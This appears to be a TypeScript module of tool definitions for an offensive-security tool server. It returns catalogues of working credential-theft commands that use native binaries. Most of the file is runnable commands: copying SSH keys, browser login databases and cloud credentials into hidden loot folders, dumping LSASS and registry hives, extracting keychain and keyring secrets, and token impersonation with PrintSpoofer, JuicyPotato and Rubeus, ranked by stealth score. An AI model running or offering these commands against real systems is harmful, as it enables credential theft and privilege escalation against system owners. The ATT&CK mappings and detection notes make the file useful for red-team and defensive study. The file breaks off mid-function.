import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface CredentialTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  binary: string;
  command: string;
  target_data: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
}

// ── cred_file_harvest ─────────────────────────────────────────────────────────

const cred_file_harvest: ToolDef = {
  name: "cred_file_harvest",
  description:
    "Find credential files (SSH keys, config files, browser data, cloud creds) using LOL binaries across platforms",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .default("all" as any)
      .describe("Target platform filter — use 'linux', 'windows', or 'macos'. Defaults to all platforms"),
    target_data: z
      .string()
      .optional()
      .describe("Type of credential data to target: 'ssh_keys', 'browser_data', 'cloud_creds', 'config_files', 'certificates', or 'all'"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform === "all" ? undefined : (args.platform as Platform);
    const targetData = args.target_data ?? "all";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform as any);
    const kbFileRead = ctx.knowledgeBase.searchByFunction("file_read", platform as any);
    const kbSsh = ctx.knowledgeBase.searchByKeyword("ssh", platform as any);
    const kbCred = ctx.knowledgeBase.searchByKeyword("credential", platform as any);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbFileRead, ...kbSsh, ...kbCred]);

    const techniques: CredentialTechnique[] = [
      {
        technique: "SSH Private Key Harvesting",
        description: "Locate and read SSH private keys from user home directories using native file-read binaries",
        platform: "linux",
        binary: "find",
        command: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | xargs cat',
        target_data: "ssh_keys",
        stealth_score: 3,
        attck_ids: ["T1552.004"],
        prerequisites: ["Read access to user home directories or /root/.ssh/"],
        detection_notes: "Auditd file access rules on ~/.ssh/. Monitor bulk file reads across /home/.",
      },
      {
        technique: "SSH Key Harvesting via tar",
        description: "Archive all SSH key material using tar for exfiltration without leaving individual access traces",
        platform: "linux",
        binary: "tar",
        command: 'tar czf /tmp/.keys.tar.gz /home/*/.ssh/ /root/.ssh/ 2>/dev/null',
        target_data: "ssh_keys",
        stealth_score: 2,
        attck_ids: ["T1552.004", "T1560.001"],
        prerequisites: ["Read access to SSH directories"],
        detection_notes: "Monitor tar operations targeting .ssh directories. Auditd file access rules.",
      },
      {
        technique: "Browser Credential Files (Linux)",
        description: "Harvest browser credential databases and cookie stores from Linux user profiles",
        platform: "linux",
        binary: "cp",
        command: 'cp ~/.mozilla/firefox/*.default-release/logins.json /tmp/.loot/ && cp ~/.config/google-chrome/Default/Login\\ Data /tmp/.loot/ && cp ~/.config/google-chrome/Default/Cookies /tmp/.loot/',
        target_data: "browser_data",
        stealth_score: 2,
        attck_ids: ["T1555.003"],
        prerequisites: ["Read access to user browser profile directories"],
        detection_notes: "File access monitoring on browser profile directories. EDR file copy events.",
      },
      {
        technique: "Browser Credential Files (Windows)",
        description: "Harvest Chrome, Firefox, and Edge credential databases from Windows user profiles",
        platform: "windows",
        binary: "xcopy.exe",
        command: 'xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" C:\\Users\\Public\\loot\\ /Y && xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies" C:\\Users\\Public\\loot\\ /Y && xcopy "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json" C:\\Users\\Public\\loot\\ /Y',
        target_data: "browser_data",
        stealth_score: 3,
        attck_ids: ["T1555.003"],
        prerequisites: ["User-level access, browser must not be running (file lock)"],
        detection_notes: "Sysmon file creation events. Monitor access to browser profile paths.",
      },
      {
        technique: "Cloud Credential Harvesting (Linux/macOS)",
        description: "Harvest AWS, GCP, and Azure CLI credential files from default configuration locations",
        platform: "linux",
        binary: "cat",
        command: 'cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; cat ~/.config/gcloud/credentials.db 2>/dev/null; cat ~/.azure/accessTokens.json 2>/dev/null; cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null',
        target_data: "cloud_creds",
        stealth_score: 3,
        attck_ids: ["T1552.001"],
        prerequisites: ["Read access to cloud CLI config directories"],
        detection_notes: "Auditd file read monitoring on cloud config directories.",
      },
      {
        technique: "Cloud Credential Harvesting (Windows)",
        description: "Harvest AWS, GCP, and Azure CLI credential files from Windows default locations",
        platform: "windows",
        binary: "type",
        command: 'type %USERPROFILE%\\.aws\\credentials & type %USERPROFILE%\\.azure\\accessTokens.json & type %APPDATA%\\gcloud\\credentials.db',
        target_data: "cloud_creds",
        stealth_score: 3,
        attck_ids: ["T1552.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor file reads on cloud CLI config directories. Sysmon file access events.",
      },
      {
        technique: "Git Credential Store",
        description: "Read plaintext Git credentials from the credential store file",
        platform: "multi",
        binary: "cat",
        command: 'cat ~/.git-credentials 2>/dev/null; cat ~/.config/git/credentials 2>/dev/null; git config --global credential.helper',
        target_data: "config_files",
        stealth_score: 2,
        attck_ids: ["T1552.001"],
        prerequisites: ["Read access to home directory, git credential store configured"],
        detection_notes: "File access monitoring on .git-credentials. Low suspicion as git is commonly used.",
      },
      {
        technique: "Configuration File Sweep (Linux)",
        description: "Search for credentials embedded in common configuration files such as .env, wp-config.php, and database configs",
        platform: "linux",
        binary: "grep",
        command: 'grep -rl "password\\|secret\\|api_key\\|token" /etc/ /opt/ /var/www/ /home/ 2>/dev/null | head -50',
        target_data: "config_files",
        stealth_score: 3,
        attck_ids: ["T1552.001"],
        prerequisites: ["Read access to application directories"],
        detection_notes: "Auditd monitoring on mass file reads. Unusual grep patterns across /etc/ and /var/www/.",
      },
      {
        technique: "Windows Credential Manager via cmdkey",
        description: "List stored credentials in Windows Credential Manager using the native cmdkey utility",
        platform: "windows",
        binary: "cmdkey.exe",
        command: "cmdkey /list",
        target_data: "config_files",
        stealth_score: 3,
        attck_ids: ["T1555.004"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor cmdkey.exe execution. Process creation events.",
      },
      {
        technique: "Certificate and PFX Harvesting",
        description: "Find and export certificate files (.pfx, .p12, .cer) which may contain private keys",
        platform: "windows",
        binary: "certutil.exe",
        command: 'dir /s /b C:\\*.pfx C:\\*.p12 C:\\*.cer 2>nul && certutil -store My',
        target_data: "certificates",
        stealth_score: 2,
        attck_ids: ["T1552.004", "T1649"],
        prerequisites: ["User or admin access depending on certificate store"],
        detection_notes: "Monitor certutil.exe usage. Sysmon process creation.",
      },
    ];

    // Filter by target_data if specified
    const filtered = targetData === "all"
      ? techniques
      : techniques.filter(t => t.target_data === targetData);

    // Filter by platform if specified
    const platformFiltered = platform
      ? filtered.filter(t => t.platform === platform || t.platform === "multi")
      : filtered;

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const sensitiveFiles = session.state.sensitiveFiles.filter(f =>
        f.path.includes(".ssh") || f.path.includes(".aws") || f.path.includes(".azure") ||
        f.path.includes("credentials") || f.path.includes("logins.json") || f.path.includes(".git-credentials"),
      );

      sessionContext = {
        environment_id: session.id,
        sensitive_credential_files: sensitiveFiles.map(f => ({ path: f.path, readable: f.readable })),
        platform: session.state.platform,
        recommendations: sensitiveFiles.length > 0
          ? `Found ${sensitiveFiles.length} credential-related file(s) — direct file harvest is possible.`
          : "No known credential files detected. Configuration sweep may reveal embedded credentials.",
      };
    }

    return json({
      target_data: targetData,
      platform: platform ?? "all",
      total_techniques: platformFiltered.length,
      techniques: platformFiltered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── cred_memory_dump ──────────────────────────────────────────────────────────

const cred_memory_dump: ToolDef = {
  name: "cred_memory_dump",
  description:
    "Find memory dump techniques for credential extraction from process memory (LSASS, ssh-agent, etc.) using LOL binaries",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .describe("Target platform for memory dump techniques"),
    target_process: z
      .string()
      .optional()
      .describe("Specific process to target: 'lsass', 'ssh-agent', 'gnome-keyring', or all"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const targetProcess = args.target_process ?? "all";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbDump = ctx.knowledgeBase.searchByFunction("dump", platform);
    const kbMemory = ctx.knowledgeBase.searchByKeyword("memory", platform);
    const kbLsass = ctx.knowledgeBase.searchByKeyword("lsass", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbDump, ...kbMemory, ...kbLsass])
      .filter(e => e.platform === platform);

    const techniques: CredentialTechnique[] = [];

    if (platform === "windows") {
      techniques.push(
        {
          technique: "LSASS Dump via comsvcs.dll (rundll32)",
          description: "Use rundll32.exe to call comsvcs.dll MiniDump export to dump the LSASS process memory",
          platform: "windows",
          binary: "rundll32.exe",
          command: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full',
          target_data: "lsass",
          stealth_score: 3,
          attck_ids: ["T1003.001"],
          prerequisites: ["SeDebugPrivilege (admin), LSASS PID"],
          detection_notes: "Sysmon Event 1 (rundll32 loading comsvcs.dll). EDR hooks on MiniDumpWriteDump. Defender Credential Guard.",
        },
        {
          technique: "LSASS Dump via Task Manager",
          description: "Create an LSASS memory dump through Task Manager's built-in process dump feature",
          platform: "windows",
          binary: "taskmgr.exe",
          command: "Right-click lsass.exe in Task Manager → Create dump file → Dump saved to %TEMP%",
          target_data: "lsass",
          stealth_score: 4,
          attck_ids: ["T1003.001"],
          prerequisites: ["Administrator access, GUI session"],
          detection_notes: "taskmgr.exe accessing lsass.exe memory. Sysmon Event 10 (ProcessAccess).",
        },
        {
          technique: "LSASS Dump via procdump.exe (Sysinternals)",
          description: "Use the Sysinternals ProcDump utility to create a full memory dump of the LSASS process",
          platform: "windows",
          binary: "procdump.exe",
          command: "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp -accepteula",
          target_data: "lsass",
          stealth_score: 4,
          attck_ids: ["T1003.001"],
          prerequisites: ["Administrator access, procdump.exe on disk"],
          detection_notes: "Well-detected by EDR. Sysmon Event 1 and 10. Credential Guard blocks dump.",
        },
        {
          technique: "LSASS Dump via Silent Process Exit",
          description: "Configure Windows Error Reporting to create a full dump of LSASS on process exit or crash via registry",
          platform: "windows",
          binary: "reg.exe",
          command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\\Windows\\Temp" /f',
          target_data: "lsass",
          stealth_score: 1,
          attck_ids: ["T1003.001"],
          prerequisites: ["Administrator access"],
          detection_notes: "Monitor SilentProcessExit registry key. Uncommon technique — lower EDR coverage.",
        },
        {
          technique: "SAM Database Dump via reg.exe",
          description: "Export SAM, SYSTEM, and SECURITY registry hives containing local account password hashes",
          platform: "windows",
          binary: "reg.exe",
          command: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.bak",
          target_data: "lsass",
          stealth_score: 3,
          attck_ids: ["T1003.002"],
          prerequisites: ["SYSTEM or Administrator access"],
          detection_notes: "Sysmon Event 1 (reg.exe save). EDR monitors registry hive exports.",
        },
      );
    }

    if (platform === "linux") {
      techniques.push(
        {
          technique: "Process Memory Dump via /proc",
          description: "Read process memory directly from /proc/<pid>/maps and /proc/<pid>/mem to extract credentials",
          platform: "linux",
          binary: "gdb",
          command: 'gdb -batch -pid <TARGET_PID> -ex "dump memory /tmp/.memdump 0x<START> 0x<END>" -ex quit',
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1003.007"],
          prerequisites: ["Root access or ptrace allowed, gdb installed"],
          detection_notes: "Monitor ptrace syscalls. Auditd ptrace rules. Yama ptrace_scope setting.",
        },
        {
          technique: "SSH Agent Key Extraction",
          description: "Dump ssh-agent memory to extract loaded private keys using process memory reading",
          platform: "linux",
          binary: "bash",
          command: 'SSH_PID=$(pgrep ssh-agent) && cat /proc/$SSH_PID/maps && gcore -o /tmp/.agent $SSH_PID',
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1552.004", "T1003.007"],
          prerequisites: ["Root or same-user access, gdb/gcore installed"],
          detection_notes: "Monitor gcore/gdb usage targeting ssh-agent. Auditd process access monitoring.",
        },
        {
          technique: "Swap File Credential Extraction",
          description: "Search swap space and memory dumps for plaintext credentials using strings",
          platform: "linux",
          binary: "strings",
          command: 'strings /dev/sda2 | grep -i "password\\|secret\\|token" | head -100',
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1003.007"],
          prerequisites: ["Root access to read block devices"],
          detection_notes: "Monitor strings command targeting block devices. Unusual block device reads.",
        },
        {
          technique: "GNOME Keyring Memory Dump",
          description: "Extract credentials from gnome-keyring-daemon process memory",
          platform: "linux",
          binary: "gcore",
          command: 'KEYRING_PID=$(pgrep gnome-keyring) && gcore -o /tmp/.keyring $KEYRING_PID && strings /tmp/.keyring.* | grep -i "password"',
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1555.001", "T1003.007"],
          prerequisites: ["Root access, GNOME desktop environment"],
          detection_notes: "Monitor gcore targeting gnome-keyring-daemon. Process memory access alerts.",
        },
      );
    }

    if (platform === "macos") {
      techniques.push(
        {
          technique: "Process Memory Dump via lldb",
          description: "Use lldb to attach to processes and dump memory regions containing credentials",
          platform: "macos",
          binary: "lldb",
          command: 'lldb -p <TARGET_PID> -o "process save-core /tmp/.coredump" -o "quit"',
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1003.007"],
          prerequisites: ["Root access or SIP disabled, Xcode Command Line Tools"],
          detection_notes: "Monitor lldb process attachments. TCC prompts may appear. SIP restricts debugging system processes.",
        },
        {
          technique: "macOS Credential Extraction via vmmap",
          description: "Map process memory regions using vmmap to identify credential storage locations before targeted extraction",
          platform: "macos",
          binary: "vmmap",
          command: "vmmap <TARGET_PID> | grep -i 'malloc\\|stack' && leaks <TARGET_PID>",
          target_data: "ssh-agent",
          stealth_score: 2,
          attck_ids: ["T1003.007"],
          prerequisites: ["Root or same-user access, developer tools"],
          detection_notes: "Monitor developer tool usage against non-development processes.",
        },
      );
    }

    // Filter by target_process if specified
    const filtered = targetProcess === "all"
      ? techniques
      : techniques.filter(t => t.target_data === targetProcess);

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        platform: session.state.platform,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated privileges available — process memory dump techniques are viable."
          : "Standard user — memory dump techniques require privilege escalation first.",
      };
    }

    return json({
      platform,
      target_process: targetProcess,
      total_techniques: filtered.length,
      techniques: filtered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── cred_keychain ─────────────────────────────────────────────────────────────

const cred_keychain: ToolDef = {
  name: "cred_keychain",
  description:
    "Find macOS Keychain access techniques for extracting stored passwords, certificates, and secrets using LOL binaries",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "macos";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbKeychain = ctx.knowledgeBase.searchByKeyword("keychain", platform);
    const kbSecurity = ctx.knowledgeBase.searchByKeyword("security", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbKeychain, ...kbSecurity])
      .filter(e => e.platform === platform);

    const techniques: CredentialTechnique[] = [
      {
        technique: "Keychain Dump via security CLI",
        description: "Use the native 'security' command to dump all passwords from the user's login keychain",
        platform,
        binary: "security",
        command: 'security dump-keychain -d ~/Library/Keychains/login.keychain-db',
        target_data: "keychain",
        stealth_score: 2,
        attck_ids: ["T1555.001"],
        prerequisites: ["User-level access, may prompt for keychain password depending on ACLs"],
        detection_notes: "Monitor security(1) usage with dump-keychain flag. TCC database access events.",
      },
      {
        technique: "Keychain Find Generic Password",
        description: "Extract a specific generic password from the keychain by service name or account",
        platform,
        binary: "security",
        command: 'security find-generic-password -s "<SERVICE_NAME>" -w ~/Library/Keychains/login.keychain-db',
        target_data: "keychain",
        stealth_score: 2,
        attck_ids: ["T1555.001"],
        prerequisites: ["User-level access, knowledge of service name"],
        detection_notes: "Monitor security find-generic-password calls. Less suspicious than full dump.",
      },
      {
        technique: "Keychain Find Internet Password",
        description: "Extract stored internet/website passwords from the keychain by server name",
        platform,
        binary: "security",
        command: 'security find-internet-password -s "<SERVER>" -w ~/Library/Keychains/login.keychain-db',
        target_data: "keychain",
        stealth_score: 2,
        attck_ids: ["T1555.001"],
        prerequisites: ["User-level access, knowledge of server name"],
        detection_notes: "Monitor security find-internet-password calls.",
      },
      {
        technique: "System Keychain Access",
        description: "Access the System keychain at /Library/Keychains/System.keychain containing system-wide credentials",
        platform,
        binary: "security",
        command: "sudo security dump-keychain -d /Library/Keychains/System.keychain",
        target_data: "keychain",
        stealth_score: 2,
        attck_ids: ["T1555.001"],
        prerequisites: ["Root or sudo access"],
        detection_notes: "Monitor security(1) accessing System.keychain. Elevated privilege requirement.",
      },
      {
        technique: "Keychain Export via certtool",
        description: "Export certificates and keys from the keychain using certtool for offline analysis",
        platform,
        binary: "certtool",
        command: "certtool y k=~/Library/Keychains/login.keychain-db",
        target_data: "keychain",
        stealth_score: 1,
        attck_ids: ["T1555.001", "T1649"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor certtool usage. Less commonly monitored than security(1).",
      },
      {
        technique: "Keychain Database File Copy",
        description: "Copy the raw keychain database file for offline cracking with tools like chainbreaker",
        platform,
        binary: "cp",
        command: "cp ~/Library/Keychains/login.keychain-db /tmp/.loot/ && cp ~/Library/Keychains/metadata.keychain-db /tmp/.loot/",
        target_data: "keychain",
        stealth_score: 2,
        attck_ids: ["T1555.001"],
        prerequisites: ["User-level access for user keychain, root for system keychain"],
        detection_notes: "File copy events on keychain database files. Endpoint detection on keychain file access.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        sip_enabled: session.state.sipEnabled,
        tcc_restrictions: session.state.tccPermissions,
        recommendations: session.state.sipEnabled
          ? "SIP enabled — system keychain may have additional protections. User keychain access is still viable."
          : "SIP disabled — full keychain access including system keychain is available.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── cred_registry ─────────────────────────────────────────────────────────────

const cred_registry: ToolDef = {
  name: "cred_registry",
  description:
    "Find Windows registry credential harvesting techniques for extracting stored passwords, autologon creds, and service account credentials",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbRegistry = ctx.knowledgeBase.searchByKeyword("registry", platform);
    const kbPassword = ctx.knowledgeBase.searchByKeyword("password", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbRegistry, ...kbPassword])
      .filter(e => e.platform === platform);

    const techniques: CredentialTechnique[] = [
      {
        technique: "Autologon Credentials (Winlogon)",
        description: "Read plaintext autologon credentials stored in the Winlogon registry key",
        platform,
        binary: "reg.exe",
        command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName & reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword & reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName',
        target_data: "autologon",
        stealth_score: 3,
        attck_ids: ["T1552.002"],
        prerequisites: ["User-level access (readable by all)"],
        detection_notes: "Sysmon Event 1 (reg.exe query on Winlogon). Common reconnaissance step.",
      },
      {
        technique: "LSA Secrets Registry Export",
        description: "Export LSA Secrets from the SECURITY registry hive containing service account credentials and cached passwords",
        platform,
        binary: "reg.exe",
        command: "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hiv",
        target_data: "lsa_secrets",
        stealth_score: 3,
        attck_ids: ["T1003.004"],
        prerequisites: ["SYSTEM-level access"],
        detection_notes: "Sysmon Event 1 (reg.exe save). EDR monitors SECURITY hive exports.",
      },
      {
        technique: "VNC Password from Registry",
        description: "Extract VNC password hashes stored in the registry (TightVNC, RealVNC, UltraVNC)",
        platform,
        binary: "reg.exe",
        command: 'reg query "HKLM\\SOFTWARE\\RealVNC\\WinVNC4" /v Password & reg query "HKCU\\SOFTWARE\\TightVNC\\Server" /v Password & reg query "HKLM\\SOFTWARE\\ORL\\WinVNC3\\Default" /v Password',
        target_data: "vnc",
        stealth_score: 2,
        attck_ids: ["T1552.002"],
        prerequisites: ["User-level access, VNC installed"],
        detection_notes: "Monitor registry queries for known VNC password locations.",
      },
      {
        technique: "PuTTY Stored Sessions",
        description: "Extract PuTTY saved sessions including proxy passwords and SSH host information from registry",
        platform,
        binary: "reg.exe",
        command: 'reg query "HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions" /s',
        target_data: "putty",
        stealth_score: 2,
        attck_ids: ["T1552.002"],
        prerequisites: ["User-level access, PuTTY installed"],
        detection_notes: "Monitor registry reads on PuTTY session keys. Reveals target hosts and credentials.",
      },
      {
        technique: "SNMP Community Strings",
        description: "Read SNMP community strings stored in the registry which can be used for network device access",
        platform,
        binary: "reg.exe",
        command: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities"',
        target_data: "snmp",
        stealth_score: 2,
        attck_ids: ["T1552.002"],
        prerequisites: ["User-level access, SNMP service installed"],
        detection_notes: "Monitor registry queries on SNMP parameters. Low suspicion level.",
      },
      {
        technique: "Cached Domain Credentials (MSCACHE)",
        description: "Export cached domain credentials (MSCACHEv2) from the SECURITY hive for offline cracking",
        platform,
        binary: "reg.exe",
        command: 'reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hiv && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hiv',
        target_data: "mscache",
        stealth_score: 3,
        attck_ids: ["T1003.005"],
        prerequisites: ["SYSTEM-level access"],
        detection_notes: "Registry hive export is well-monitored. Sysmon Event 1.",
      },
      {
        technique: "Windows Credential Manager via vaultcmd",
        description: "Enumerate stored credentials in Windows Vault using the native vaultcmd utility",
        platform,
        binary: "vaultcmd.exe",
        command: 'vaultcmd /list && vaultcmd /listschema && vaultcmd /listcreds:"Windows Credentials" /all',
        target_data: "vault",
        stealth_score: 3,
        attck_ids: ["T1555.004"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor vaultcmd.exe process creation. Less common than cmdkey.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const registryKeys = session.state.registryKeys;
      const winlogonKeys = registryKeys.filter(k =>
        k.path.toLowerCase().includes("winlogon"),
      );

      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        winlogon_keys_accessible: winlogonKeys.length > 0,
        recommendations: session.state.privilegeLevel === "system"
          ? "SYSTEM access — all registry credential harvesting techniques are viable including LSA Secrets and MSCACHE."
          : session.state.privilegeLevel === "admin"
            ? "Admin access — most techniques viable. LSA Secrets may require SYSTEM impersonation."
            : "User-level access — Autologon creds, VNC passwords, PuTTY sessions, and Credential Manager are accessible.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── cred_token_theft ──────────────────────────────────────────────────────────

const cred_token_theft: ToolDef = {
  name: "cred_token_theft",
  description:
    "Find token theft and impersonation techniques for privilege escalation and lateral movement via stolen access tokens",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    token_type: z
      .enum(["access_token", "delegation_token", "impersonation_token"])
      .optional()
      .describe("Type of token to target: 'access_token', 'delegation_token', or 'impersonation_token'"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const tokenType = args.token_type ?? "all";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbToken = ctx.knowledgeBase.searchByKeyword("token", platform);
    const kbImpersonate = ctx.knowledgeBase.searchByKeyword("impersonate", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbToken, ...kbImpersonate])
      .filter(e => e.platform === platform);

    const techniques: (CredentialTechnique & { token_category: string })[] = [
      {
        technique: "Token Impersonation via Incognito",
        description: "Use Meterpreter's Incognito module or standalone incognito.exe to list and impersonate available tokens",
        platform,
        binary: "incognito.exe",
        command: "incognito.exe list_tokens -u && incognito.exe execute -c \"DOMAIN\\Admin\" cmd.exe",
        target_data: "token",
        token_category: "impersonation_token",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"],
        detection_notes: "Monitor for token manipulation API calls. Sysmon Event 1 for incognito.exe.",
      },
      {
        technique: "Named Pipe Impersonation (PrintSpoofer)",
        description: "Abuse SeImpersonatePrivilege via named pipe impersonation to escalate from service account to SYSTEM",
        platform,
        binary: "PrintSpoofer.exe",
        command: "PrintSpoofer.exe -i -c cmd.exe",
        target_data: "token",
        token_category: "impersonation_token",
        stealth_score: 2,
        attck_ids: ["T1134.001", "T1134.004"],
        prerequisites: ["SeImpersonatePrivilege (service accounts like IIS, MSSQL)"],
        detection_notes: "Monitor named pipe creation. PrintSpoofer.exe signature detection.",
      },
      {
        technique: "Potato Attacks (JuicyPotato/GodPotato)",
        description: "Abuse COM/DCOM token impersonation to escalate from service accounts with SeImpersonatePrivilege to SYSTEM",
        platform,
        binary: "JuicyPotato.exe",
        command: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami\" -t * -c {CLSID}",
        target_data: "token",
        token_category: "impersonation_token",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege, COM server availability"],
        detection_notes: "Monitor unusual COM object instantiation. JuicyPotato/GodPotato binary detection.",
      },
      {
        technique: "Token Duplication via PowerShell",
        description: "Use PowerShell to duplicate an access token from a running process and create a new process with that token",
        platform,
        binary: "powershell.exe",
        command: '[Reflection.Assembly]::LoadWithPartialName("System.Security"); # Use Win32 API DuplicateTokenEx to duplicate token from target process and CreateProcessWithTokenW to spawn shell',
        target_data: "token",
        token_category: "access_token",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeDebugPrivilege for cross-process token access"],
        detection_notes: "PowerShell script block logging. API call monitoring (DuplicateTokenEx).",
      },
      {
        technique: "Kerberos Delegation Token Abuse",
        description: "Abuse unconstrained delegation to capture and reuse Kerberos TGTs from connecting users",
        platform,
        binary: "Rubeus.exe",
        command: "Rubeus.exe monitor /interval:5 /nowrap",
        target_data: "token",
        token_category: "delegation_token",
        stealth_score: 1,
        attck_ids: ["T1558.001", "T1134"],
        prerequisites: ["Compromised host with unconstrained delegation, Active Directory environment"],
        detection_notes: "Event ID 4768/4769. Monitor TGT requests from delegation-enabled hosts.",
      },
      {
        technique: "S4U Constrained Delegation Abuse",
        description: "Abuse constrained delegation via S4U2Self and S4U2Proxy to impersonate users to allowed services",
        platform,
        binary: "Rubeus.exe",
        command: 'Rubeus.exe s4u /user:<SVC_ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt',
        target_data: "token",
        token_category: "delegation_token",
        stealth_score: 1,
        attck_ids: ["T1558.001", "T1134"],
        prerequisites: ["Compromised service account with constrained delegation configured"],
        detection_notes: "Event ID 4769 with S4U flags. Unusual service ticket requests.",
      },
    ];

    // Filter by token type if specified
